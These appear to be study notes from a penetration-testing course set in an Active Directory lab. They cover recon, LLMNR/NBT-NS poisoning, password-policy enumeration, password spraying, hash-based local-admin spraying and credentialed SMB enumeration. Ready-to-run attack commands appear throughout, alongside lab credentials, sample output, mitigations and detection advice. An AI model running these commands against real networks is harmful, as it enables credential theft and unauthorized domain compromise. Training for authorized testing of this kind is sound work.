# External Recon and Enumeration Principles

#### Purpose of External Reconnaissance:
1. **Validation:** Confirm scoping document information, ensuring accurate alignment with the client's target.
2. **Scope Assurance:** Avoid unintended interactions with systems outside the authorized scope.
3. **Information Gathering:** Identify publicly available data that could facilitate the penetration test, like leaked credentials or infrastructure details.

### What to Look For:

| **Data Point**      | **Description**                                                                                                   |
|----------------------|-------------------------------------------------------------------------------------------------------------------|
| **IP Space**         | Identifying ASN, netblocks, DNS entries, and cloud infrastructure.                                               |
| **Domain Information** | Subdomains, domain services, defenses like SIEM, AV, and IPS/IDS.                                               |
| **Schema Format**    | Email/AD username conventions and password policies for attacks like password spraying or credential stuffing.    |
| **Data Disclosures** | Metadata in public documents, links to intranet, or credentials in repositories like GitHub.                     |
| **Breach Data**      | Publicly leaked usernames, passwords, or hashes for unauthorized access to services.                             |

### Where to Look:

| **Resource**              | **Examples**                                                                                               |
|---------------------------|-----------------------------------------------------------------------------------------------------------|
| **ASN/IP Registrars**      | IANA, ARIN, RIPE, BGP Toolkit for IP/ASN research.                                                        |
| **Domain/DNS Records**     | Domaintools, PTRArchive, ICANN, and manual DNS queries to find subdomains and validate information.        |
| **Social Media**           | LinkedIn, Twitter, Facebook for organizational details, user roles, or infrastructure clues.              |
| **Public Websites**        | Check the "About Us" and "Contact Us" pages for embedded documents, emails, and organizational charts.     |
| **Cloud & Dev Repos**      | GitHub, AWS S3 buckets, and Google Dorks for accidentally exposed credentials or sensitive files.          |
| **Breach Sources**         | HaveIBeenPwned, Dehashed to find corporate emails, plaintext passwords, or hashes in breach databases.     |

### Steps and Tools:

1. **Finding Address Spaces:**  
   - Use BGP Toolkit or similar to identify ASN/IP ranges tied to the target.
   - Validate addresses with tools like
     ```
     nslookup
     ```
     and online DNS services (e.g., viewdns.info ,https://bgp.he.net/ ,https://research.domaintools.com/ ). 

2. **Hunting Documents and Emails:**  
   - **Search:** Use Google Dorks like
     ```
     filetype:pdf inurl:target.com
     ```
     or
     ```
     intext:"@target.com"
     ```
     to find sensitive files and email addresses.
   - **Save Locally:** Keep all findings organized for deeper inspection.

3. **Username Harvesting:**  
   - Tools like `linkedin2username` can generate potential username formats based on public employee data.

4. **Credential Hunting:**  
   - Search breach databases (e.g., Dehashed) to find leaked credentials for external-facing services.  
   - **Example Dork:**
     ```
     sudo python3 dehashed.py -q inlanefreight.local -p
     ```
     

### Key Enumeration Principles:

1. **Passive to Active Approach:** Begin with passive recon (no direct engagement) and gradually move to active enumeration once you identify potential targets.
2. **Iterative Process:** Continuously revisit and refine findings based on new data.
3. **Validate Results:** Cross-check data from multiple sources for consistency and accuracy.
4. **Stay In Scope:** Always ensure your actions are authorized and documented.

This methodology ensures thorough preparation and minimizes the risk of errors during penetration testing. Let me know if you'd like more specific examples or a focus on tools for automation!

---

# Initial Enumeration of the Domain
![image](https://github.com/user-attachments/assets/b35654f9-5fa7-4dba-8cbf-c916eb17b67b)



#### Setting Up
For this penetration test, we are starting on an attack host within the internal network of Inlanefreight. The customer has provided a **custom pentest VM** connected to their internal network, and we are to perform non-evasive testing starting from an unauthenticated standpoint with a **standard domain user account (htb-student)**.



#### Tasks:
1. **Enumerate the internal network** to identify hosts, services, and potential vulnerabilities.
2. Perform **passive enumeration** first (using tools like Wireshark and Responder), followed by **active checks** (using tools like `fping` and Nmap).
3. **Document findings** for later use, including details on:
   - AD Users
   - AD Joined Computers (Domain Controllers, file servers, etc.)
   - Key Services (Kerberos, NetBIOS, LDAP, DNS)
   - Vulnerable Hosts and Services



### 1. Identifying Hosts (Passive Enumeration)

#### **Wireshark Capture**
To capture network traffic and identify hosts, start by running Wireshark on the attack host.

```bash
sudo -E wireshark
```

*Wireshark output shows ARP requests and MDNS broadcasts, revealing the following hosts:*
- `172.16.5.5`
- `172.16.5.25`
- `172.16.5.50`
- `172.16.5.100`
- `172.16.5.125`



#### **Tcpdump Capture**
If you are on a host without a GUI, you can use `tcpdump` to capture network traffic and save it to a `.pcap` file for later analysis with Wireshark.

```bash
sudo tcpdump -i ens224
```



#### **Responder Analysis**
Responder can be used in passive mode to listen for LLMNR, NBT-NS, and MDNS requests, identifying additional hosts.

```bash
sudo responder -I ens224 -A
```

*Responder output reveals:*
- New hosts: `172.16.5.200`, `172.16.5.225`, `ACADEMY-EA-WEB01`



### 2. Active Enumeration of Hosts

#### **FPing ICMP Sweep**
To check for active hosts in the `172.16.5.0/23` range, use `fping` to perform an ICMP sweep.

```bash
fping -asgq 172.16.5.0/23
```

*Results show 9 live hosts including the attack host.*



### 3. Nmap Scan of Active Hosts

With the list of live hosts, use Nmap for detailed service enumeration, targeting protocols like DNS, LDAP, SMB, and Kerberos.

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

*Nmap scan reveals services on `172.16.5.5`:*
- **53/tcp**: Simple DNS Plus
- **88/tcp**: Kerberos
- **389/tcp**: LDAP (Active Directory)
- **445/tcp**: Microsoft-DS
- **636/tcp**: SSL/LDAP



### 4. Key Data Points Collected:
- **AD Users**: To target for password spraying or further enumeration.
- **AD Computers**: Identifying key systems like domain controllers.
- **Key Services**: Identified Kerberos, LDAP, DNS, SMB services.
- **Vulnerable Hosts**: Noticed open ports and services that might be exploitable.


## Identifying Users for Internal Penetration Testing

When no user is provided to start testing with, the goal is to establish a foothold in the domain using various techniques. The most common methods for obtaining access are:

- **Clear text credentials or NTLM password hashes** for a valid user.
- **SYSTEM shell** on a domain-joined host.
- **Shell in the context of a domain user account.**

### Initial Steps for User Enumeration

1. **Kerbrute for Kerberos Pre-authentication Failure**  
   Kerbrute is a stealthy tool used for enumerating domain accounts by exploiting Kerberos pre-authentication failures. Since these failures often do not trigger logs or alerts, it’s a useful tool for attacking from an unauthenticated perspective.

#### Setting up Kerbrute
- **Clone the Kerbrute GitHub repo**:
  ```bash
  sudo git clone https://github.com/ropnop/kerbrute.git
  ```

- **Compile the binaries for the platform** (e.g., Linux):
  ```bash
  cd kerbrute
  make all
  ```

- **Check compiled binaries**:
  ```bash
  ls dist/
  ```

- **Move the binary to a local directory for easier access**:
  ```bash
  sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
  ```

#### Testing Kerbrute:
```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
- This command uses **Kerbrute** with a user list (`jsmith.txt`) to enumerate valid users in the domain `INLANEFREIGHT.LOCAL` using the domain controller at `172.16.5.5`. The results are saved to the `valid_ad_users` file.

### Example Output:
- The output will list valid usernames such as:
  ```
  [+] VALID USERNAME: jjones@INLANEFREIGHT.LOCAL
  [+] VALID USERNAME: sbrown@INLANEFREIGHT.LOCAL
  [+] VALID USERNAME: tjohnson@INLANEFREIGHT.LOCAL
  ```

### SYSTEM Access
- The **SYSTEM account** (NT AUTHORITY\SYSTEM) is a built-in Windows account with the highest privilege level.
- SYSTEM access allows enumeration of Active Directory, Kerberoasting, ASREPRoasting, and other powerful attacks like SMB relay or ACL attacks.

#### Ways to gain SYSTEM access:
- **Remote Windows exploits** like MS08-067, EternalBlue, BlueKeep.
- **Abusing services** running in the context of SYSTEM (e.g., Juicy Potato on older systems).
- **Local privilege escalation** through flaws such as Windows 10 Task Scheduler vulnerabilities.
- **Using Psexec to run SYSTEM-level commands** after gaining admin access.

#### Post-SYSTEM Access Actions:
- Enumerate the domain using tools like **BloodHound** or **PowerView**.
- Run attacks like **Kerberoasting** or **ASREPRoasting**.
- Harvest **Net-NTLMv2 hashes** or perform **SMB relay** attacks using tools like **Inveigh**.
- **Token impersonation** for privilege escalation.
- **ACL attacks** to manipulate permissions.

### Considerations for Stealth
- **Non-evasive tests**: Higher noise and less concern for stealth.
- **Evasive or red team engagements**: Stealth is critical. Using tools like **Nmap** or other noisy tools may trigger alerts. Always clarify the assessment's goals with the client.

---

# LLMNR/NBT-NS Poisoning from Linux

### Overview
- **Goal:** Acquire valid cleartext credentials for a domain user account.
- **Techniques:** Network poisoning and password spraying.
- **Tools:** Responder and Inveigh.

### LLMNR & NBT-NS Primer
- **LLMNR:** Uses port 5355 over UDP, for name resolution if DNS fails.
- **NBT-NS:** Uses port 137 over UDP, as a fallback if LLMNR fails.
- **Vulnerability:** Any host on the network can respond to LLMNR/NBT-NS queries, allowing for a Man-in-the-Middle attack.

### Attack Flow
1. Host attempts connection to a non-existent server.
2. DNS fails to resolve the host.
3. Host broadcasts request on local network.
4. Attacker (with Responder) responds, posing as the requested host.
5. Host sends authentication request to attacker.
6. Attacker captures the NTLMv2 password hash.

### Tools for LLMNR/NBT-NS Poisoning
- **Responder:** 
  - A tool for poisoning LLMNR, NBT-NS, and MDNS requests.
  - Can capture hashes and store them in log files.
- **Inveigh:** 
  - Cross-platform MITM tool for spoofing and poisoning attacks.
  - Written in C# and PowerShell.
- **Metasploit:** 
  - Has modules for spoofing and poisoning attacks.

### Using Responder
- **Install Responder:**
  ```bash
  sudo apt-get install responder
  ```
- **Run Responder with default settings:**
  ```bash
  sudo responder -I <network_interface>
  ```
  Replace `<network_interface>` with your actual network interface, e.g., `ens224`.
- **Common options:**
  - `-A`: Analyze mode, sees requests without poisoning.
  - `-w`: Start WPAD rogue proxy server.
  - `-f`: Fingerprint remote host OS and version.
  - `-v`: Increased verbosity.
  - `-F`: Force NTLM or Basic authentication.
  - `-P`: Force proxy authentication.
- **Example Command:**
  ```bash
  sudo responder -I ens224 -wf
  ```

### Ports to Ensure Availability
- **UDP:** 137, 138, 53, 1434, 5355, 5353
- **TCP:** 80, 135, 139, 445, 21, 25, 110, 587, 3128, 3141, 1433, 389

### Configuration File
- **Location:** `/usr/share/responder/Responder.conf`
- **Adjustments:** Disable rogue servers and setup logging as needed.

### Responder Logs
- **Log files:** Stored in `/usr/share/responder/logs` with format `MODULE_NAME-HASH_TYPE-CLIENT_IP.txt`
  ```bash
  ls /usr/share/responder/logs
  ```
  Example:
  ```bash
  SMB-NTLMv2-SSP-172.16.5.25.txt
  ```

### Capturing with Responder
1. **Start Responder in a tmux window:**
   ```bash
   tmux
   sudo responder -I ens224
   ```
2. **Crack captured hashes using Hashcat:**
   ```bash
   hashcat -m 5600 <hash_file> <wordlist>
   ```
   Replace `<hash_file>` with the path to your hash file and `<wordlist>` with the path to your wordlist.

### TTPs
- **Objective:** Collect authentication information (NTLMv1/NTLMv2 password hashes).
- **Cracking Hashes:** Use tools like Hashcat or John to crack the hashes offline.
- **Further Use:** Utilize cleartext passwords for initial foothold or expanded access within the domain.

---

# LLMNR/NBT-NS Poisoning - from Windows
### Overview
Inveigh is a tool written in PowerShell and C# that can listen to multiple protocols, including LLMNR, DNS, mDNS, NBNS, and more. It's useful for capturing credentials on Windows hosts.

### Using the PowerShell Version

1. **Import the module and list parameters:**
   ```powershell
   PS C:\htb> Import-Module .\Inveigh.ps1
   PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
   ```

2. **Start Inveigh with LLMNR and NBNS spoofing:**
   ```powershell
   PS C:\htb> Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
   ```

### Using the C# Version (InveighZero)
The C# version is actively maintained and combines original and ported code. It's available pre-compiled in the C:\Tools folder, but it's good practice to compile it yourself using Visual Studio.

1. **Run the C# executable:**
   ```powershell
   PS C:\htb> .\Inveigh.exe
   ```

2. **View help options:**
   ```
   C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
   ```

### Useful Console Commands

- **Get queued console output:**
  ```plaintext
  GET CONSOLE
  ```

- **Get captured NTLMv2 hashes (unique):**
  ```plaintext
  GET NTLMV2UNIQUE
  ```

- **Get captured NTLMv2 usernames:**
  ```plaintext
  GET NTLMV2USERNAMES
  ```

### Example Output

#### Unique NTLMv2 Hashes
```plaintext
backupagent::INLANEFREIGHT:B5013246091943D7:...
forend::INLANEFREIGHT:32FD89BD78804B04:...
...
```

#### NTLMv2 Usernames
```plaintext
IP Address    Host            Username                     Challenge
172.16.5.125  ACADEMY-EA-FILE  INLANEFREIGHT\backupagent    B5013246091943D7
172.16.5.125  ACADEMY-EA-FILE  INLANEFREIGHT\forend         32FD89BD78804B04
...
```


## Remediation

### Mitre ATT&CK Reference
- **ID:** T1557.001
- **Technique:** Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

### Mitigation Steps
To prevent LLMNR and NBT-NS spoofing attacks, it's crucial to disable these protocols cautiously after testing their impact on your network.

1. **Disable LLMNR via Group Policy:**
   - Navigate to: `Computer Configuration --> Administrative Templates --> Network --> DNS Client`
   - Enable: **Turn OFF Multicast Name Resolution**

2. **Disable NBT-NS Locally:**
   - Open **Network and Sharing Center** under **Control Panel**
   - Click **Change adapter settings**
   - Right-click on the adapter, view properties
   - Select **Internet Protocol Version 4 (TCP/IPv4)**
   - Click **Properties** -> **Advanced** -> **WINS** tab
   - Select **Disable NetBIOS over TCP/IP**

3. **Disable NBT-NS via PowerShell Script:**
   - Script to disable NetBIOS:
     ```powershell
     $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
     Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
     ```
   - Add the script to **Startup** in Local Group Policy:
     - Navigate to: `Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup`
     - Add the PowerShell script

4. **Push Out GPO Script Domain-Wide:**
   - Create a GPO using **Group Policy Management**
   - Host the script on the **SYSVOL** share and call it via UNC path:
     ```
     \\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
     ```
   - Apply GPO to specific OUs and ensure the script runs on reboot

5. **Additional Mitigations:**
   - Filter network traffic to block LLMNR/NetBIOS
   - Enable SMB Signing to prevent NTLM relay attacks
   - Use network intrusion detection/prevention systems
   - Implement network segmentation

## Detection

### Detecting Attack Behavior
1. **Inject LLMNR and NBT-NS Requests:**
   - Inject requests for non-existent hosts across subnets
   - Alert if any responses are received

2. **Monitor Network Traffic:**
   - Ports: UDP 5355 (LLMNR) and UDP 137 (NetBIOS)

3. **Monitor Event IDs:**
   - Event ID 4697
   - Event ID 7045

4. **Monitor Registry Key:**
   - Registry: `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`
   - DWORD value `EnableMulticast`, where `0` indicates LLMNR is disabled

---

# Password Spraying Overview

**Password spraying** is trying a common password with a list of usernames to gain access without triggering account lockouts.

#### Key Points:
- **Method:** Use one common password across many usernames.
- **Purpose:** Gain initial access or a foothold in a network.
- **Precaution:** Introduce delays to avoid account lockouts.

### Scenarios

1. **Example 1:**
   - **Method:** Combined GitHub and LinkedIn username lists.
   - **Tool:** Kerbrute.
   - **Outcome:** Gained low-privileged access, then escalated using `BloodHound`.

2. **Example 2:**
   - **Method:** Scraped PDF metadata for username patterns.
   - **Outcome:** Enumerated all domain users, gained passwords, and compromised the domain.

### Considerations

- **Risk of Lockouts:** Avoid frequent attempts to prevent account lockouts.
- **Internal Use:** Use for lateral movement within a network.
- **Password Policy:** Know the domain's policy to minimize risks.

### Practical Tips:

- **Delays:** Wait hours between attempts.
- **Client Communication:** Clarify password policies.
- **Enumeration:** Use provided accounts to discover password policies.

---

# Enumerating & Retrieving Password Policies

In various IT security scenarios, enumerating and retrieving password policies are essential steps to understand and secure the domain environment. This process can vary depending on whether you have valid credentials or are attempting to access information without authentication.

#### 1. **Credentialed Enumeration from Linux:**

With valid domain credentials, you can retrieve the domain password policy remotely using tools like CrackMapExec or rpcclient.

- **Tools:** CrackMapExec, rpcclient
- **Command Example:**
  ```sh
   crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
  ```

#### 2. **SMB NULL Sessions (Unauthenticated):**

SMB NULL sessions are a misconfiguration that allows unauthenticated attackers to access information about the domain, including user lists, groups, computers, and the password policy. This often occurs due to legacy Domain Controllers being upgraded, bringing along insecure configurations from older Windows Server versions.

- **Misconfiguration:** Often result from upgrading legacy Domain Controllers.
- **Tools:** enum4linux, CrackMapExec, rpcclient
- **Command Example:**
  ```sh
  $ rpcclient -U "" -N 172.16.5.5
  rpcclient $> querydominfo
  rpcclient $> getdompwinfo
  ```

#### 3. **Using enum4linux:**

enum4linux is a tool built around the Samba suite of tools used for enumeration of Windows hosts and domains.

- **Original Tool:**
  ```sh
    enum4linux -P 172.16.5.5
  ```
- **Updated Tool (enum4linux-ng):**
  ```sh
   enum4linux-ng -P 172.16.5.5 -oA ilfreight
  ```

**Command Example for JSON/YAML output:**
  ```sh
   cat ilfreight.json
  ```

#### 4. **Null Session from Windows:**

Although less common, null sessions can also be performed from Windows using specific commands.

- **Command Example:**
  ```sh
   net use \\DC01\ipc$ "" /u:""
  ```

- **Common Errors:**
  - **Account is Disabled:**
    ```sh
    C:\htb> net use \\DC01\ipc$ "" /u:guest
    System error 1331 has occurred.
    ```
  - **Password is Incorrect:**
    ```sh
    C:\htb> net use \\DC01\ipc$ "password" /u:guest
    System error 1326 has occurred.
    ```
  - **Account is Locked Out:**
    ```sh
    C:\htb> net use \\DC01\ipc$ "password" /u:guest
    System error 1909 has occurred.
    ```

#### 5. **LDAP Anonymous Bind (Unauthenticated):**

LDAP anonymous binds allow unauthenticated attackers to retrieve domain information. This legacy configuration can sometimes still be found, exposing sensitive information.

- **Tools:** windapsearch.py, ldapsearch, ad-ldapdomaindump.py
- **Command Example:**
  ```sh
  ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
  ```

#### 6. **Built-in Windows Commands (Authenticated):**

If you can authenticate to the domain, built-in Windows tools or third-party tools can be used to retrieve the password policy.

- **Tools:** net.exe, PowerView, CrackMapExec (Windows), SharpMapExec, SharpView

Using built-in commands is particularly useful if you land on a Windows system and cannot transfer additional tools to it.

### Analyzing the Password Policy

**From net accounts command:**
```sh
net accounts

```

**Key Points:**
- **Passwords never expire:** Maximum password age set to Unlimited.
- **Minimum password length:** 8.
- **Lockout threshold:** 5 wrong passwords.
- **Lockout duration:** 30 minutes.
- **Password spraying:** Effective due to the eight-character minimum and auto-unlock feature.

#### Using PowerView

**Command Example:**
```powershell
 import-module .\PowerView.ps1
 Get-DomainPolicy

```

**Key Points:**
- **Minimum password length:** 8.
- **Password complexity:** Enabled (PasswordComplexity=1). meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character
- **Lockout threshold:** 5.
- **Lockout duration:** 30 minutes.
- **Password history size:** 24.

if password policy is not retrieved rule of thumb is max tries is 3-5 and make sure not to lockout accounts.

---

# Password Spraying - Making a Target User List

## Detailed User Enumeration
To mount a successful password spraying attack, we need a list of valid domain users to attempt to authenticate with. Here are several ways to gather a target list of valid users:

- Leverage an SMB NULL session to retrieve a complete list of domain users from the domain controller.
- Utilize an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list.
- Use a tool such as Kerbrute to validate users utilizing a word list from sources such as the **statistically-likely-usernames GitHub repo**, or create a list of potentially valid users using tools like **linkedin2username**.
- Use a set of credentials from a Linux or Windows attack system provided by our client or obtained through other means, such as LLMNR/NBT-NS response poisoning using Responder, or a successful password spray using a smaller wordlist.

### Domain Password Policy
Consider the domain password policy:
- If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy.
- The policy includes minimum password length and whether password complexity is enabled, helping us formulate the list of passwords for spray attempts.
- Knowing the account lockout threshold and bad password timer will inform us how many spray attempts we can make without locking out any accounts and the time to wait between attempts.

If the password policy is unknown, we can:
- Ask our client.
- Try a targeted password spray as a "hail mary".
- Perform one spray every few hours to avoid locking out accounts.

Always log the activities:
- Accounts targeted
- Domain Controller used in the attack
- Time and date of the spray
- Password(s) attempted

### Methods to Pull User List

#### SMB NULL Session
If we lack valid domain credentials, check for SMB NULL sessions or LDAP anonymous binds on Domain Controllers to obtain a list of all users within Active Directory and the password policy.

Some tools that leverage SMB NULL sessions and LDAP anonymous binds:
- enum4linux
- rpcclient
- CrackMapExec


### Using enum4linux
```shell
 enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### Using rpcclient
```shell
 rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```

### Using CrackMapExec with the --users flag
```shell
 crackmapexec smb 172.16.5.5 --users
```
This is a useful tool that will also show the badpwdcount (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the baddpwdtime, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset.
### Gathering Users with LDAP Anonymous

#### Using ldapsearch
```shell
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

#### Using windapsearch
```shell
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


### Enumerating Users with Kerbrute
- Uses Kerberos Pre-Authentication to enumerate valid AD accounts and for password spraying.
- Does not generate Windows event ID 4625 (logon failure).
- The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration.

```shell
# Using Kerbrute User Enumeration
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Credentialed Enumeration to Build User List
With valid credentials, use any of the tools stated previously to build a user list. 

```shell
# Using CrackMapExec with Valid Credentials
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

---

# Internal Password Spraying - from Linux

## Overview
Once we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. This section focuses on performing password spraying from Linux hosts.

## Using rpcclient
Rpcclient is an excellent option for performing this attack from Linux. A valid login is indicated by the response "Authority Name". We can filter out invalid login attempts by grepping for "Authority" in the response.

### Bash One-Liner for the Attack
```shell
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Example Output
```shell
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

## Using Kerbrute
Kerbrute can also be used for the same attack.

### Command
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

### Example Output
```shell
[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
Done! Tested 57 logins (1 successes) in 0.172 seconds
```

## Using CrackMapExec
CrackMapExec accepts a text file of usernames to be run against a single password in a spraying attack. We grep for "+" to filter out logon failures and focus on valid login attempts.

### Command
```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### Example Output
```shell
SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

## Validating Credentials with CrackMapExec
After getting hits with our password spraying attack, we can use CrackMapExec to validate the credentials quickly against a Domain Controller.

### Command
```shell
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Example Output
```shell
SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

## Local Administrator Password Reuse
Internal password spraying is also possible with local administrator accounts. If you obtain the NTLM password hash or cleartext password for the local administrator account, this can be attempted across multiple hosts in the network.

### Local Admin Spraying with CrackMapExec
```shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### Example Output
```shell
SMB 172.16.5.50 445 ACADEMY-EA-MX01 [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB 172.16.5.25 445 ACADEMY-EA-MS01 [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB 172.16.5.125 445 ACADEMY-EA-WEB0 [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

## Considerations
- This technique is noisy and not suitable for stealthy assessments.
- Highlight this issue during penetration tests, even if it is not part of the path to compromise the domain.
- Use the free Microsoft tool Local Administrator Password Solution (LAPS) to manage local administrator passwords and enforce unique passwords on each host that rotate on a set interval.

---

# Internal Password Spraying - from Windows

## Using DomainPasswordSpray.ps1
- **Tool**: DomainPasswordSpray.ps1
- **Use Case**: Automatically generate a user list from AD, query password policy, and exclude near-lockout accounts.
- **Command**:
  ```shell
  Import-Module .\DomainPasswordSpray.ps1
   Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
  ```
- **Output**: Writes successes to `spray_success`.

## Mitigations

### Multi-Factor Authentication
- **Description**: Reduces risk significantly.
- **Example**: Push notifications, OTP, RSA keys, text message confirmations.

### Restricting Access
- **Description**: Limit application access to necessary users only.

### Reducing Impact of Successful Exploitation
- **Description**: Use separate admin accounts, application-specific permission levels, and network segmentation.

### Password Hygiene
- **Description**: Educate users on creating strong passwords, use password filters.

## Other Considerations
- **Password Lockout Policy**: Ensure it doesn’t increase DoS risks.
- **Detection**: Monitor for event ID 4625 and 4771. Correlate many logon failures within a set time interval to trigger alerts. attacker may avoid SMB password spraying and instead target LDAP. 
- **External Password Spraying**: Commonly targets Microsoft 0365, OWA, Skype for Business, Citrix portals, VPN portals, etc.

# Enumerating Security Controls

## Purpose
- **Goal**: Understand the security controls in place within an organization to inform decisions about tool usage during AD enumeration, exploitation, and post-exploitation.

## Key Tools and Techniques

### Windows Defender
- **Tool**: Get-MpComputerStatus (PowerShell cmdlet).
- **Function**: Check the current status of Windows Defender on a system.
- **Example**:
  ```shell
  Get-MpComputerStatus
  ```
RealTimeProtectionEnabled parameter is set to True, which means Defender is enabled on the system.
### AppLocker
- **Purpose**: Application whitelisting solution to control which applications can run on a system.
- **Tool**: Get-AppLockerPolicy (PowerShell cmdlet).
- **Function**: Enumerate AppLocker policies.
- **Example**:
  ```shell
   Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  ```
 It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations such as **%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe or PowerShell_ISE.exe.**
### PowerShell Constrained Language Mode
- **Purpose**: Lock down PowerShell features to enhance security.
- **Tool**: PowerShell command to check language mode.
- **Function**: Determine if the system is in Full Language Mode or Constrained Language Mode.
- **Example**:
  ```shell
   $ExecutionContext.SessionState.LanguageMode
  ```

### LAPS (Local Administrator Password Solution)
- **Purpose**: Randomize and rotate local administrator passwords on Windows hosts.
- **Tools**:
  - **Find-LAPSDelegatedGroups**: Identify groups that can read LAPS passwords.
  - **Find-AdmPwdExtendedRights**: Check rights on computers with LAPS enabled.
  - **Get-LAPSComputers**: List computers with LAPS enabled and their passwords.
- **Examples**:
  ```shell
   Find-LAPSDelegatedGroups
  ```
  ```
   Find-AdmPwdExtendedRights
  ```
  ```
   Get-LAPSComputers
  ```

## Importance
- **Understand Protections**: Knowing the security controls helps avoid or modify tools and plan actions effectively.
- **Target Specific Users**: Identify AD users who can read LAPS passwords for targeted actions.
  
---

# Credentialed Enumeration From Linux 

Credentialed enumeration involves leveraging valid domain user credentials to gather detailed information about domain users, groups, permissions, and shares. Below are step-by-step notes and commands for conducting such enumeration.

#### **1. Setting Up**
- **Credentials**: User `forend` with password `Klmcargo2`.
- **Domain Controller (DC)**: Address is `172.16.5.5`.
- Commands should be prefaced with `sudo` when necessary.
- **Linux Host**: Use tools installed on `ATTACK01` Parrot Linux.



### **Using CrackMapExec (CME)**

#### **Basic Syntax for CME**
```bash
crackmapexec smb [target] -u [username] -p [password] [options]
```

#### **Enumerate Domain Users**
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
- **Output**: Lists domain users with attributes like `badPwdCount`, useful for identifying locked accounts or accounts with repeated failed login attempts.

#### **Enumerate Domain Groups**
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
- **Output**: Lists groups, their member counts, and identifies groups of interest like `Domain Admins` or `Backup Operators`.

#### **Enumerate Logged-On Users**
```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
- **Output**: Shows currently logged-on users, useful for identifying administrative accounts or potential targets.

#### **Enumerate SMB Shares**
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
- **Output**: Displays available shares on the target, including their permissions (`READ` or `WRITE`).

#### **Spidering Shares for Files**
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
- **Output**: Crawls through a specific share (e.g., `Department Shares`) and saves results in JSON format at `/tmp/cme_spider_plus/<ip of host>.json`.



### **Using SMBMap**

#### **Basic Syntax for SMBMap**
```bash
smbmap -u [username] -p [password] -d [domain] -H [target IP] [options]
```

#### **Check Share Access**
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
- **Output**: Lists shares and access permissions.

#### **Recursively List Directories in a Share**
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
- **Output**: Lists all subdirectories in the `Department Shares`.




### **Using rpcclient**
`rpcclient` leverages the Samba protocol for various Active Directory (AD) tasks, including user and group enumeration.

#### **Basic Connection**
```bash
rpcclient -U "" -N 172.16.5.5
```
- **-U ""**: Unauthenticated SMB NULL session.
- **-N**: No password.

#### **Enumerate Domain Users**
```bash
rpcclient $> enumdomusers
```
- **Output**: Displays domain users and their RIDs (Relative Identifiers).

#### **Query User by RID**
```bash
rpcclient $> queryuser [RID]
```
- Example for `htb-student` RID (0x457):
  ```bash
  rpcclient $> queryuser 0x457
  ```

